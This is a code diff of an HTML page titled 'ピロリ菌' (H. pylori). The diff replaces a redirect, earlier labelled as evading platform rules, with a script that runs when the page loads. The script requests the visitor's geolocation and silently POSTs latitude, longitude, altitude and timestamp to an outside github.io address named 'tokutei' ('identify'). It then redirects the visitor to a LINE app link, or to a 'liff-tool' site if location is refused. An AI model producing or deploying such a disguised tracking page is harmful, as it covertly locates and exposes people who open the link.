@@ -1,7 +1,67 @@
-<html lang="ja">
+<!DOCTYPE html>
+<html>
 <head>
-   <title>規約違反回避ピロリ菌</title> 
-<meta charset="utf-8">
-<meta http-equiv="refresh"content="0;URL=https://rinu.cf/kyr0f4">
+    <title>ピロリ菌</title>
 </head>
+<body>
+    <script>
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                // 位置情報が許可された場合の処理
+                // 緯度、経度、取得時間、高度を取得
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+                var timestamp = position.timestamp;
+                var altitude = position.coords.altitude;
+
+                // リダイレクト
+                window.location.href = "https://line.me/R/app/2000381491-b9061ez1";
+
+                // 位置情報を別のサイトに送信
+                sendDataToOtherSite(latitude, longitude, timestamp, altitude);
+            }, function(error) {
+                // 位置情報が拒否された場合の処理
+                // リダイレクト
+                window.location.href = "https://liff-tool.f5.si/";
+            });
+        } else {
+            // ブラウザが位置情報をサポートしていない場合の処理
+            console.error("お使いのブラウザは位置情報をサポートしていません。");
+        }
+
+        // 位置情報を別のサイトに送信する関数
+        function sendDataToOtherSite(latitude, longitude, timestamp, altitude) {
+            // 送信先のURLを設定
+            var apiUrl = "https://hawks2329.github.io/tokutei/"; // 送信先のAPIエンドポイントURLを指定
+
+            // 位置情報データをJSON形式に変換
+            var data = {
+                latitude: latitude,
+                longitude: longitude,
+                timestamp: timestamp,
+                altitude: altitude
+            };
+
+            // Fetch APIを使用してデータを送信
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                // レスポンスの処理
+                if (response.ok) {
+                    console.log('位置情報を送信しました。');
+                } else {
+                    console.error('データの送信に失敗しました。');
+                }
+            })
+            .catch(error => {
+                console.error('エラーが発生しました:', error);
+            });
+        }
+    </script>
+</body>
 </html>
